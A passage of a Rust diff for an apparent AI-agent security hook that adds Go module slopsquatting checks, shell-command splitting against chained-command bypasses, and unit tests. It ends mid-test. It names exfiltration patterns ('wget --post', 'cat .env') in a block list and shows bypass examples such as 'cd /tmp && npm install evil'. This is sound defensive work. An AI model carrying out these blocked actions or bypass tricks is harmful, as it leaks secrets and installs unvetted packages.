@@ -53,6 +53,54 @@ impl Default for NpmConfig {
     }
 }
 
+/// Go module ecosystem configuration for hook behaviour.
+///
+/// Loaded from the `[sentinel.go]` section of the config file. When
+/// unavailable, all protections default to enabled with standard trusted
+/// prefixes.
+#[derive(Debug, Clone)]
+pub struct GoConfig {
+    /// Module paths that skip slopsquatting checks (exact match).
+    pub allowlist: Vec<String>,
+    /// Trusted module path prefixes that skip checks (e.g., `"golang.org/x/"`).
+    pub trusted_prefixes: Vec<String>,
+}
+
+impl Default for GoConfig {
+    fn default() -> Self {
+        Self {
+            allowlist: Vec::new(),
+            trusted_prefixes: default_go_trusted_prefixes(),
+        }
+    }
+}
+
+/// Default trusted Go module path prefixes.
+///
+/// First-party and well-known module paths considered trusted. Standard
+/// library packages are not fetched via `go get` so they are not listed.
+#[must_use]
+pub fn default_go_trusted_prefixes() -> Vec<String> {
+    vec![
+        "golang.org/x/".to_owned(),
+        "google.golang.org/".to_owned(),
+        "cloud.google.com/go/".to_owned(),
+        "github.com/golang/".to_owned(),
+    ]
+}
+
+/// Bundle of per-ecosystem package manager configurations.
+///
+/// Passed to hook handlers to control allowlisting and ecosystem-specific
+/// behaviour. New ecosystems (Cargo, Docker) add fields here in v0.4.0.
+#[derive(Debug, Clone, Default)]
+pub struct PackageManagerConfigs {
+    /// npm/JS package manager configuration.
+    pub npm: NpmConfig,
+    /// Go module ecosystem configuration.
+    pub go: GoConfig,
+}
+
 /// Result of checking whether a package exists on a registry.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum PackageCheckResult {
@@ -69,6 +117,7 @@ pub enum PackageCheckResult {
 pub enum Registry {
     Npm,
     PyPI,
+    Go,
 }
 
 impl std::fmt::Display for Registry {
@@ -76,11 +125,191 @@ impl std::fmt::Display for Registry {
         match self {
             Self::Npm => write!(f, "npm"),
             Self::PyPI => write!(f, "PyPI"),
+            Self::Go => write!(f, "Go"),
         }
     }
 }
 
-/// Extract all package names from an install command, filtering out flags.
+/// Split a compound shell string into individual command fragments.
+///
+/// Splits on `&&`, `||`, `;`, `|`, `\n`, backtick boundaries, and `$(`.
+/// Tracks single/double-quote state so that `echo "foo && bar"` is NOT
+/// split on the inner `&&`. Over-splitting is acceptable in a security
+/// context: more checks are always safer than fewer.
+///
+/// **Unmatched-quote safety (S1):** If the input has unmatched quotes
+/// (e.g. `npm install 'foo && pip install evil`), the quote-tracking
+/// loop would swallow the `&&` separator and hide the chained command.
+/// To prevent this bypass, when the loop ends with a quote still open we
+/// fall back to `split_shell_commands_unquoted`, which ignores all quote
+/// state and splits purely on operators. Over-splitting is the safe
+/// direction.
+fn split_shell_commands(input: &str) -> Vec<&str> {
+    let mut commands = Vec::new();
+    let mut start = 0;
+    let bytes = input.as_bytes();
+    let len = bytes.len();
+    let mut i = 0;
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+
+    while i < len {
+        let b = bytes[i];
+
+        // Track quote state
+        if b == b'\'' && !in_double_quote {
+            in_single_quote = !in_single_quote;
+            i += 1;
+            continue;
+        }
+        if b == b'"' && !in_single_quote {
+            in_double_quote = !in_double_quote;
+            i += 1;
+            continue;
+        }
+        // Backslash escape (outside single quotes)
+        if b == b'\\' && !in_single_quote && i + 1 < len {
+            i += 2;
+            continue;
+        }
+
+        // Only split when outside quotes
+        if !in_single_quote && !in_double_quote {
+            // && or ||
+            if i + 1 < len
+                && ((b == b'&' && bytes[i + 1] == b'&') || (b == b'|' && bytes[i + 1] == b'|'))
+            {
+                let fragment = &input[start..i];
+                if !fragment.trim().is_empty() {
+                    commands.push(fragment.trim());
+                }
+                i += 2;
+                start = i;
+                continue;
+            }
+            // ; or \n or backtick
+            if b == b';' || b == b'\n' || b == b'`' {
+                let fragment = &input[start..i];
+                if !fragment.trim().is_empty() {
+                    commands.push(fragment.trim());
+                }
+                i += 1;
+                start = i;
+                continue;
+            }
+            // Single | (pipe) — already excluded || above
+            if b == b'|' {
+                let fragment = &input[start..i];
+                if !fragment.trim().is_empty() {
+                    commands.push(fragment.trim());
+                }
+                i += 1;
+                start = i;
+                continue;
+            }
+            // $( subshell
+            if b == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
+                let fragment = &input[start..i];
+                if !fragment.trim().is_empty() {
+                    commands.push(fragment.trim());
+                }
+                i += 2;
+                start = i;
+                continue;
+            }
+        }
+        i += 1;
+    }
+
+    // S1: If quotes are still open the input has unmatched quotes.
+    // Fall back to quote-unaware splitting so chained commands hidden
+    // inside the "quoted" region are still detected.
+    if in_single_quote || in_double_quote {
+        return split_shell_commands_unquoted(input);
+    }
+
+    // Final fragment
+    let fragment = &input[start..];
+    if !fragment.trim().is_empty() {
+        commands.push(fragment.trim());
+    }
+    commands
+}
+
+/// Quote-unaware fallback for [`split_shell_commands`].
+///
+/// Splits on the same operators but completely ignores quote characters.
+/// Used when the input has unmatched quotes, where over-splitting is the
+/// conservative (safe) choice.
+fn split_shell_commands_unquoted(input: &str) -> Vec<&str> {
+    let mut commands = Vec::new();
+    let mut start = 0;
+    let bytes = input.as_bytes();
+    let len = bytes.len();
+    let mut i = 0;
+
+    while i < len {
+        let b = bytes[i];
+
+        // && or ||
+        if i + 1 < len
+            && ((b == b'&' && bytes[i + 1] == b'&') || (b == b'|' && bytes[i + 1] == b'|'))
+        {
+            let fragment = &input[start..i];
+            if !fragment.trim().is_empty() {
+                commands.push(fragment.trim());
+            }
+            i += 2;
+            start = i;
+            continue;
+        }
+        // ; or \n or backtick
+        if b == b';' || b == b'\n' || b == b'`' {
+            let fragment = &input[start..i];
+            if !fragment.trim().is_empty() {
+                commands.push(fragment.trim());
+            }
+            i += 1;
+            start = i;
+            continue;
+        }
+        // Single | (pipe) — already excluded || above
+        if b == b'|' {
+            let fragment = &input[start..i];
+            if !fragment.trim().is_empty() {
+                commands.push(fragment.trim());
+            }
+            i += 1;
+            start = i;
+            continue;
+        }
+        // $( subshell
+        if b == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
+            let fragment = &input[start..i];
+            if !fragment.trim().is_empty() {
+                commands.push(fragment.trim());
+            }
+            i += 2;
+            start = i;
+            continue;
+        }
+        i += 1;
+    }
+
+    // Final fragment
+    let fragment = &input[start..];
+    if !fragment.trim().is_empty() {
+        commands.push(fragment.trim());
+    }
+    commands
+}
+
+/// Extract all package names from a (possibly compound) command string.
+///
+/// Splits compound commands on shell operators (`&&`, `||`, `;`, `|`, etc.)
+/// and extracts packages from each sub-command independently. This prevents
+/// chained commands like `cd /tmp && npm install evil` from bypassing
+/// extraction.
 ///
 /// Parses commands like:
 /// - `npm install foo bar` -> `[("foo", Npm), ("bar", Npm)]`
@@ -88,11 +317,23 @@ impl std::fmt::Display for Registry {
 /// - `npm install --save-dev foo -g bar` -> `[("foo", Npm), ("bar", Npm)]`
 /// - `npx prettier .` -> `[("prettier", Npm)]`
 /// - `npx --package=cowsay -- cowsay hello` -> `[("cowsay", Npm)]`
+/// - `cd /tmp && npm install evil` -> `[("evil", Npm)]`
 ///
 /// Returns an empty vec if no packages are found (e.g., bare `npm install`
 /// from lockfile, or `npm ci` which installs from lockfile).
 fn extract_all_packages(command: &str) -> Vec<(String, Registry)> {
-    let normalised = command.replace('\t', " ");
+    let mut all_packages = Vec::new();
+
+    for fragment in split_shell_commands(command) {
+        all_packages.extend(extract_packages_from_fragment(fragment));
+    }
+
+    all_packages
+}
+
+/// Extract packages from a single (non-compound) command fragment.
+fn extract_packages_from_fragment(fragment: &str) -> Vec<(String, Registry)> {
+    let normalised = fragment.replace('\t', " ");
     let trimmed = normalised.trim();
 
     // npm/pnpm/yarn/bun install patterns
@@ -133,6 +374,14 @@ fn extract_all_packages(command: &str) -> Vec<(String, Registry)> {
     for prefix in pip_prefixes {
         if let Some(rest) = trimmed.strip_prefix(prefix) {
             return parse_package_args(rest, &Registry::PyPI);
+        }
+    }
+
+    // go get / go install patterns
+    let go_prefixes: &[&str] = &["go get ", "go install "];
+    for prefix in go_prefixes {
+        if let Some(rest) = trimmed.strip_prefix(prefix) {
+            return parse_go_module_args(rest);
         }
     }
 
@@ -275,6 +524,93 @@ fn is_valid_curl_package_name(name: &str) -> bool {
     })
 }
 
+/// Parse Go module arguments from the portion after `go get` or `go install`.
+///
+/// Go commands use flags like `-u`, `-d`, `-t`, `-v`, and support multiple
+/// module paths. Relative paths (`./...`, `../...`) and the keyword `all`
+/// are filtered out since they refer to local packages, not remote modules.
+///
+/// Version suffixes like `@v1.8.0` and `@latest` are stripped.
+fn parse_go_module_args(args: &str) -> Vec<(String, Registry)> {
+    let mut modules = Vec::new();
+
+    for token in args.split_whitespace() {
+        // Skip flags (-u, -d, -t, -v, -insecure, etc.)
+        if token.starts_with('-') {
+            continue;
+        }
+
+        // Skip relative paths (./..., ../..., ./cmd/foo)
+        if token.starts_with("./") || token.starts_with("../") || token == "." || token == ".." {
+            continue;
+        }
+
+        // Skip the "all" keyword (refers to all packages in the module)
+        if token == "all" {
+            continue;
+        }
+
+        // Strip version suffix: github.com/gorilla/mux@v1.8.0 -> github.com/gorilla/mux
+        let module_path = token.find('@').map_or(token, |at| &token[..at]);
+
+        // Strip trailing /... wildcard (go get github.com/user/repo/...)
+        let module_path = module_path.strip_suffix("/...").unwrap_or(module_path);
+
+        // Validate it looks like a Go module path (has a domain)
+        if is_valid_go_module_path(module_path) {
+            modules.push((module_path.to_owned(), Registry::Go));
+        }
+    }
+
+    modules
+}
+
+/// Validate that a string looks like a Go module path.
+///
+/// Go module paths must start with a domain (contain a `.` in the first
+/// path segment), contain at least one `/`, and not start or end with `/`.
+/// Examples: `github.com/gorilla/mux`, `golang.org/x/crypto`.
+fn is_valid_go_module_path(path: &str) -> bool {
+    if path.is_empty() || path.starts_with('/') || path.ends_with('/') {
+        return false;
+    }
+
+    // Must have at least one slash (domain/path)
+    let Some(first_slash) = path.find('/') else {
+        return false;
+    };
+
+    // First segment must contain a dot (domain name)
+    let domain = &path[..first_slash];
+    if !domain.contains('.') {
+        return false;
+    }
+
+    // All characters must be valid for Go module paths.
+    // Character set matches is_valid_curl_package_name (minus @) to ensure
+    // paths that pass validation here also pass the curl URL validator.
+    path.bytes()
+        .all(|b| b.is_ascii_alphanumeric() || b == b'/' || b == b'_' || b == b'.' || b == b'-')
+}
+
+/// Encode a Go module path for the module proxy URL.
+///
+/// The Go module proxy uses "case-encoding" where uppercase ASCII letters
+/// are replaced with `!` followed by the lowercase letter.
+/// E.g., `github.com/Azure/azure-sdk` -> `github.com/!azure/azure-sdk`.
+fn go_module_case_encode(module: &str) -> String {
+    let mut encoded = String::with_capacity(module.len() + 8);
+    for ch in module.chars() {
+        if ch.is_ascii_uppercase() {
+            encoded.push('!');
+            encoded.push(ch.to_ascii_lowercase());
+        } else {
+            encoded.push(ch);
+        }
+    }
+    encoded
+}
+
 /// Check whether a package exists on its registry using a synchronous HTTP
 /// HEAD request via `curl`.
 ///
@@ -301,6 +637,10 @@ fn check_package_exists_with_timeout(
     let url = match registry {
         Registry::Npm => format!("https://registry.npmjs.org/{name}"),
         Registry::PyPI => format!("https://pypi.org/pypi/{name}/json"),
+        Registry::Go => {
+            let encoded = go_module_case_encode(name);
+            format!("https://proxy.golang.org/{encoded}/@latest")
+        }
     };
 
     let timeout_str = timeout_secs.to_string();
@@ -328,7 +668,7 @@ fn check_package_exists_with_timeout(
             let code = code.trim();
             match code {
                 "200" => PackageCheckResult::Exists,
-                "404" => PackageCheckResult::NotFound,
+                "404" | "410" => PackageCheckResult::NotFound,
                 _ => PackageCheckResult::CheckFailed(format!("registry returned HTTP {code}")),
             }
         }
@@ -802,6 +1142,11 @@ const NETWORK_EXFIL_SUBSTRINGS: &[&str] = &["wget --post", "wget --post-file"];
 /// Check whether `command` starts with `word` or contains it preceded by a
 /// shell meta-character (pipe, semicolon, `&&`, backtick, `$(`, newline, or
 /// start-of-string).
+// NOTE: This function uses its own separator list and does NOT track quote
+// state (unlike split_shell_commands). This is intentional: command_invokes
+// is used for blocklist checks where over-matching (false positives) is safe,
+// while split_shell_commands is used for package extraction where we need
+// quote-aware splitting. The two approaches are complementary, not redundant.
 fn command_invokes(command: &str, word: &str) -> bool {
     // Direct prefix: "cat .env"
     if command.starts_with(word)
@@ -1287,24 +1632,43 @@ const NPM_INSTALL_PATTERNS: &[&str] = &[
     "bun i ",
 ];
 
-/// Return `true` if the normalised command matches any of the npm-family
-/// install patterns (with trailing space) or the bare command without
-/// trailing space at end-of-string.
-fn is_npm_install_command(normalised: &str) -> bool {
-    for pat in NPM_INSTALL_PATTERNS {
-        if normalised.contains(pat) || normalised.ends_with(pat.trim_end()) {
-            return true;
-        }
-    }
-    false
+/// Return `true` if any sub-command (after shell-operator splitting) matches
+/// an npm-family install pattern. Uses `split_shell_commands()` so that
+/// detection is consistent with extraction.
+fn is_npm_install_command(command: &str) -> bool {
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        NPM_INSTALL_PATTERNS
+            .iter()
+            .any(|pat| trimmed.starts_with(pat) || trimmed == pat.trim_end())
+    })
 }
 
-/// Return `true` if the normalised command matches a pip/pip3 install pattern.
-fn is_pip_install_command(normalised: &str) -> bool {
-    normalised.contains("pip install ")
-        || normalised.contains("pip3 install ")
-        || normalised.ends_with("pip install")
-        || normalised.ends_with("pip3 install")
+/// Return `true` if any sub-command matches a pip/pip3 install pattern.
+fn is_pip_install_command(command: &str) -> bool {
+    let pip_patterns: &[&str] = &["pip install ", "pip3 install ", "uv pip install "];
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        pip_patterns
+            .iter()
+            .any(|pat| trimmed.starts_with(pat) || trimmed == pat.trim_end())
+    })
+}
+
+/// Go install command patterns.
+const GO_INSTALL_PATTERNS: &[&str] = &["go get ", "go install "];
+
+/// Return `true` if any sub-command matches a Go get/install pattern.
+fn is_go_install_command(command: &str) -> bool {
+    split_shell_commands(command).iter().any(|frag| {
+        let normalised = frag.replace('\t', " ");
+        let trimmed = normalised.trim();
+        GO_INSTALL_PATTERNS
+            .iter()
+            .any(|pat| trimmed.starts_with(pat) || trimmed == pat.trim_end())
+    })
 }
 
 /// Evaluate a pre-bash hook.
@@ -1320,10 +1684,24 @@ pub fn pre_bash(input: &HookInput) -> HookOutput {
     pre_bash_with_npm_config(input, &NpmConfig::default())
 }
 
-/// Inner pre-bash handler that also accepts npm configuration.
+/// Pre-bash handler that accepts npm configuration (legacy signature).
+///
+/// Delegates to [`pre_bash_with_configs`] with default Go configuration.
+#[must_use]
+pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> HookOutput {
+    let configs = PackageManagerConfigs {
+        npm: npm_config.clone(),
+        go: GoConfig::default(),
+    };
+    pre_bash_with_configs(input, &configs)
+}
+
+/// Pre-bash handler that accepts the full package manager config bundle.
 #[must_use]
 #[allow(clippy::too_many_lines)]
-pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> HookOutput {
+pub fn pre_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs) -> HookOutput {
+    let npm_config = &configs.npm;
+    let go_config = &configs.go;
     if let Some(ref cfg) = input.config {
         if !cfg.claude_hooks {
             return HookOutput::allow();
@@ -1451,10 +1829,11 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
     // --- Package manager install checks (slopsquatting) ---
     // H4: Check ALL packages in multi-package install commands.
     // M16: After successful check, do NOT emit extra pip install warning.
-    // M3: Use npm allowlist to suppress checks for allowlisted packages.
+    // M3: Use npm/go allowlist to suppress checks for allowlisted packages.
     // M7: Warn on CheckFailed rather than silently allowing.
-    let is_npm_install = is_npm_install_command(&normalised);
-    let is_pip_install = is_pip_install_command(&normalised);
+    let is_npm_install = is_npm_install_command(command);
+    let is_pip_install = is_pip_install_command(command);
+    let is_go_install = is_go_install_command(command);
 
     // Read package existence check config: default to enabled with 5s timeout
     let check_pkg_existence = input
@@ -1466,13 +1845,23 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
         (cfg.package_check_timeout_ms / 1000).max(1)
     });
 
-    if is_npm_install || is_pip_install {
+    if is_npm_install || is_pip_install || is_go_install {
         let packages = extract_all_packages(command);
         let mut warnings: Vec<String> = Vec::new();
 
         for (name, registry) in &packages {
-            // M3: Skip allowlisted packages
-            if npm_config.allowlist.iter().any(|a| a == name) {
+            // Skip allowlisted packages (per-registry allowlist)
+            let is_allowlisted = match registry {
+                Registry::Npm | Registry::PyPI => npm_config.allowlist.iter().any(|a| a == name),
+                Registry::Go => {
+                    go_config.allowlist.iter().any(|a| a == name)
+                        || go_config
+                            .trusted_prefixes
+                            .iter()
+                            .any(|prefix| name.starts_with(prefix.as_str()))
+                }
+            };
+            if is_allowlisted {
                 continue;
             }
 
@@ -1488,21 +1877,35 @@ pub fn pre_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> Ho
                 }
                 PackageCheckResult::NotFound => {
                     // H4: Block if ANY package doesn't exist
-                    return HookOutput::block(format!(
-                        "Blocked: package '{name}' not found on {registry} \
-                         (possible typosquatting/slopsquatting)\n\
-                         To proceed: verify package at {} and run directly in your terminal",
-                        match registry {
-                            Registry::Npm => format!("npmjs.com/package/{name}"),
-                            Registry::PyPI => format!("pypi.org/project/{name}"),
-                        }
-                    ));
+                    let msg = match registry {
+                        Registry::Go => format!(
+                            "Blocked: module '{name}' not found on Go \
+                             (possible typosquatting/slopsquatting)\n\
+                             To proceed: verify at pkg.go.dev/{name}, add to \
+                             [sentinel.go] allowlist, or run directly in your terminal"
+                        ),
+                        _ => format!(
+                            "Blocked: package '{name}' not found on {registry} \
+                             (possible typosquatting/slopsquatting)\n\
+                             To proceed: verify package at {} and run directly in your terminal",
+                            match registry {
+                                Registry::Npm => format!("npmjs.com/package/{name}"),
+                                Registry::PyPI => format!("pypi.org/project/{name}"),
+                                // Go is handled above; this arm is unreachable
+                                // but required for exhaustive matching.
+                                Registry::Go => format!("pkg.go.dev/{name}"),
+                            }
+                        ),
+                    };
+                    return HookOutput::block(msg);
                 }
                 PackageCheckResult::CheckFailed(ref reason) => {
                     // M7: Warn on CheckFailed rather than silently proceeding
                     warnings.push(format!(
-                        "Could not verify package '{name}' exists on {registry} ({reason}). \
-                         Proceeding but cannot confirm package legitimacy."
+                        "Could not verify package '{name}' on {registry}: {reason}. \
+                         Install will proceed, but package legitimacy is unconfirmed. \
+                         If this persists, check your internet connection or adjust \
+                         package_check_timeout_ms in your Sanctum config."
                     ));
                 }
             }
@@ -2090,6 +2493,16 @@ pub fn post_bash(input: &HookInput) -> HookOutput {
     post_bash_with_npm_config(input, &NpmConfig::default())
 }
 
+/// Post-bash handler that accepts the full package manager config bundle.
+///
+/// Currently delegates to [`post_bash_with_npm_config`] (no Go-specific
+/// logic in Phase 1). Signature exists for forward compatibility with
+/// Go `init()` monitoring in Phase 2.
+#[must_use]
+pub fn post_bash_with_configs(input: &HookInput, configs: &PackageManagerConfigs) -> HookOutput {
+    post_bash_with_npm_config(input, &configs.npm)
+}
+
 /// Scan stdout/stderr for credential values and push warnings.
 fn scan_output_for_credentials(
     stdout: &str,
@@ -2152,7 +2565,6 @@ pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> H
         .unwrap_or("");
 
     let combined_output = format!("{stdout}\n{stderr}");
-    let normalised_cmd = command.replace('\t', " ");
 
     let mut warnings: Vec<String> = Vec::new();
 
@@ -2209,7 +2621,7 @@ pub fn post_bash_with_npm_config(input: &HookInput, npm_config: &NpmConfig) -> H
 
     // 7. Warn about npm lifecycle script risks (M3: gated by watch_lifecycle)
     if npm_config.watch_lifecycle
-        && is_npm_install_command(&normalised_cmd)
+        && is_npm_install_command(command)
         && (combined_output.contains("lifecycle") || combined_output.contains("postinstall"))
     {
         warnings.push(
@@ -6494,5 +6906,657 @@ mod expanded_claude_tests {
             HookDecision::Block,
             "roo files should be blocked"
         );
+    }
+
+    // ---- Go module slopsquatting tests ----
+
+    fn bash_input(command: &str) -> HookInput {
+        make_test_input("bash", json!({ "command": command }))
+    }
+
+    // -- Registry enum --
+
+    #[test]
+    fn registry_go_display() {
+        assert_eq!(format!("{}", Registry::Go), "Go");
+    }
+
+    #[test]
+    fn registry_go_equality() {
+        assert_eq!(Registry::Go, Registry::Go);
+        assert_ne!(Registry::Go, Registry::Npm);
+    }
+
+    // -- Go module path validation --
+
+    #[test]
+    fn is_valid_go_module_path_standard() {
+        assert!(is_valid_go_module_path("github.com/gorilla/mux"));
+    }
+
+    #[test]
+    fn is_valid_go_module_path_golang_org() {
+        assert!(is_valid_go_module_path("golang.org/x/crypto"));
+    }
+
+    #[test]
+    fn is_valid_go_module_path_deep() {
+        assert!(is_valid_go_module_path("github.com/a/b/c/d/e"));
+    }
+
+    #[test]
+    fn is_valid_go_module_path_no_slash() {
+        assert!(!is_valid_go_module_path("github.com"));
+    }
+
+    #[test]
+    fn is_valid_go_module_path_no_domain() {
+        assert!(!is_valid_go_module_path("foo/bar"));
+    }
+
+    #[test]
+    fn is_valid_go_module_path_leading_slash() {
+        assert!(!is_valid_go_module_path("/github.com/foo"));
+    }
+
+    #[test]
+    fn is_valid_go_module_path_trailing_slash() {
+        assert!(!is_valid_go_module_path("github.com/foo/"));
+    }
+
+    #[test]
+    fn is_valid_go_module_path_empty() {
+        assert!(!is_valid_go_module_path(""));
+    }
+
+    // -- Go case encoding --
+
+    #[test]
+    fn go_case_encode_lowercase() {
+        assert_eq!(
+            go_module_case_encode("github.com/gorilla/mux"),
+            "github.com/gorilla/mux"
+        );
+    }
+
+    #[test]
+    fn go_case_encode_uppercase() {
+        assert_eq!(
+            go_module_case_encode("github.com/Azure/azure-sdk"),
+            "github.com/!azure/azure-sdk"
+        );
+    }
+
+    #[test]
+    fn go_case_encode_multiple_upper() {
+        assert_eq!(
+            go_module_case_encode("github.com/BurntSushi/toml"),
+            "github.com/!burnt!sushi/toml"
+        );
+    }
+
+    #[test]
+    fn go_case_encode_empty() {
+        assert_eq!(go_module_case_encode(""), "");
+    }
+
+    // -- Go command detection --
+
+    #[test]
+    fn is_go_install_command_go_get() {
+        assert!(is_go_install_command("go get github.com/gorilla/mux"));
+    }
+
+    #[test]
+    fn is_go_install_command_go_install() {
+        assert!(is_go_install_command(
+            "go install github.com/golangci/golangci-lint@latest"
+        ));
+    }
+
+    #[test]
+    fn is_go_install_command_bare_go_get() {
+        assert!(is_go_install_command("go get"));
+    }
+
+    #[test]
+    fn is_go_install_command_negative_go_build() {
+        assert!(!is_go_install_command("go build ./..."));
+    }
+
+    #[test]
+    fn is_go_install_command_negative_go_run() {
+        assert!(!is_go_install_command("go run main.go"));
+    }
+
+    #[test]
+    fn is_go_install_command_negative_go_mod_tidy() {
+        assert!(!is_go_install_command("go mod tidy"));
+    }
+
+    // -- Go module extraction --
+
+    #[test]
+    fn extract_go_module_simple() {
+        let pkgs = extract_all_packages("go get github.com/gorilla/mux");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/gorilla/mux");
+        assert_eq!(pkgs[0].1, Registry::Go);
+    }
+
+    #[test]
+    fn extract_go_module_with_version() {
+        let pkgs = extract_all_packages("go get github.com/gorilla/mux@v1.8.0");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/gorilla/mux");
+    }
+
+    #[test]
+    fn extract_go_module_with_latest() {
+        let pkgs = extract_all_packages("go get github.com/gorilla/mux@latest");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/gorilla/mux");
+    }
+
+    #[test]
+    fn extract_go_module_multiple() {
+        let pkgs = extract_all_packages("go get github.com/a/b github.com/c/d");
+        assert_eq!(pkgs.len(), 2);
+        assert_eq!(pkgs[0].0, "github.com/a/b");
+        assert_eq!(pkgs[1].0, "github.com/c/d");
+    }
+
+    #[test]
+    fn extract_go_module_with_flags() {
+        let pkgs = extract_all_packages("go get -u github.com/gorilla/mux");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/gorilla/mux");
+    }
+
+    #[test]
+    fn extract_go_module_with_d_flag() {
+        let pkgs = extract_all_packages("go get -d github.com/gorilla/mux");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/gorilla/mux");
+    }
+
+    #[test]
+    fn extract_go_module_with_t_flag() {
+        let pkgs = extract_all_packages("go get -t github.com/gorilla/mux");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/gorilla/mux");
+    }
+
+    #[test]
+    fn extract_go_module_skips_relative_path() {
+        let pkgs = extract_all_packages("go get ./...");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn extract_go_module_skips_all_keyword() {
+        let pkgs = extract_all_packages("go get all");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn extract_go_module_skips_dot_dot() {
+        let pkgs = extract_all_packages("go get ../foo");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn extract_go_module_go_install_subpath() {
+        let pkgs = extract_all_packages(
+            "go install github.com/golangci/golangci-lint/cmd/golangci-lint@latest",
+        );
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(
+            pkgs[0].0,
+            "github.com/golangci/golangci-lint/cmd/golangci-lint"
+        );
+    }
+
+    #[test]
+    fn extract_go_module_bare_go_get() {
+        let pkgs = extract_all_packages("go get");
+        assert!(pkgs.is_empty());
+    }
+
+    #[test]
+    fn extract_go_module_wildcard_stripped() {
+        let pkgs = extract_all_packages("go get github.com/user/repo/...");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/user/repo");
+    }
+
+    #[test]
+    fn extract_go_module_tilde_rejected() {
+        // Tilde is not allowed — char set must match curl validator
+        let pkgs = extract_all_packages("go get example.com/user~evil/pkg");
+        assert!(
+            pkgs.is_empty(),
+            "module paths with ~ should be rejected to match curl validator"
+        );
+    }
+
+    // -- Trusted prefix security --
+
+    #[test]
+    fn trusted_prefix_cloud_google_requires_slash() {
+        let go = GoConfig::default();
+        // cloud.google.com/go/ matches cloud.google.com/go/storage
+        assert!(go
+            .trusted_prefixes
+            .iter()
+            .any(|p| "cloud.google.com/go/storage".starts_with(p.as_str())));
+        // cloud.google.com/go/ does NOT match cloud.google.com/go-evil
+        assert!(!go
+            .trusted_prefixes
+            .iter()
+            .any(|p| "cloud.google.com/go-evil".starts_with(p.as_str())));
+    }
+
+    #[test]
+    fn trusted_prefix_golang_org_x_no_false_match() {
+        let go = GoConfig::default();
+        // golang.org/x/ matches golang.org/x/crypto
+        assert!(go
+            .trusted_prefixes
+            .iter()
+            .any(|p| "golang.org/x/crypto".starts_with(p.as_str())));
+        // golang.org/x/ does NOT match golang.org/xss
+        assert!(!go
+            .trusted_prefixes
+            .iter()
+            .any(|p| "golang.org/xss".starts_with(p.as_str())));
+    }
+
+    // -- GoConfig --
+
+    #[test]
+    fn go_config_default_trusted_prefixes() {
+        let go = GoConfig::default();
+        assert!(go.trusted_prefixes.iter().any(|p| p == "golang.org/x/"));
+        assert!(go
+            .trusted_prefixes
+            .iter()
+            .any(|p| p == "google.golang.org/"));
+    }
+
+    #[test]
+    fn go_config_custom_allowlist() {
+        let go = GoConfig {
+            allowlist: vec!["github.com/my-org/internal".to_owned()],
+            ..GoConfig::default()
+        };
+        assert!(go
+            .allowlist
+            .iter()
+            .any(|a| a == "github.com/my-org/internal"));
+    }
+
+    #[test]
+    fn go_config_empty_allowlist() {
+        let go = GoConfig::default();
+        assert!(go.allowlist.is_empty());
+    }
+
+    // -- PackageManagerConfigs --
+
+    #[test]
+    fn package_manager_configs_default() {
+        let configs = PackageManagerConfigs::default();
+        assert!(configs.npm.watch_lifecycle);
+        assert!(configs.go.allowlist.is_empty());
+        assert!(!configs.go.trusted_prefixes.is_empty());
+    }
+
+    #[test]
+    fn pre_bash_with_configs_delegates() {
+        let input = bash_input("echo hello");
+        let npm_output = pre_bash_with_npm_config(&input, &NpmConfig::default());
+        let configs_output = pre_bash_with_configs(&input, &PackageManagerConfigs::default());
+        assert_eq!(npm_output.decision, configs_output.decision);
+    }
+
+    // -- Pre-bash Go integration --
+
+    #[test]
+    fn pre_bash_go_get_extracts_packages() {
+        let pkgs = extract_all_packages("go get github.com/gorilla/mux");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].1, Registry::Go);
+    }
+
+    #[test]
+    fn pre_bash_go_get_with_flags_extracts() {
+        let pkgs = extract_all_packages("go get -u -v github.com/gorilla/mux");
+        assert_eq!(pkgs.len(), 1);
+        assert_eq!(pkgs[0].0, "github.com/gorilla/mux");
+    }
+
+    #[test]
+    fn pre_bash_go_get_skips_trusted_prefix() {
+        let input = bash_input("go get golang.org/x/crypto");
+        let configs = PackageManagerConfigs::default();
+        let output = pre_bash_with_configs(&input, &configs);
+        // golang.org/x/ is a trusted prefix, so no registry check should happen.
+        // Without network access, a non-trusted module would get CheckFailed
+        // warning, but trusted prefixes skip the check entirely -> Allow.
+        assert_eq!(
+            output.decision,
+            HookDecision::Allow,
+            "trusted prefix golang.org/x/ should skip slopsquatting check"
+        );
+    }
+
+    #[test]
+    fn pre_bash_go_get_skips_allowlisted() {
+        let input = bash_input("go get github.com/my-org/internal");
+        let configs = PackageManagerConfigs {
+            go: GoConfig {
+                allowlist: vec!["github.com/my-org/internal".to_owned()],
+                ..GoConfig::default()
+            },
+            ..PackageManagerConfigs::default()
+        };
+        let output = pre_bash_with_configs(&input, &configs);
+        assert_eq!(
+            output.decision,
+            HookDecision::Allow,
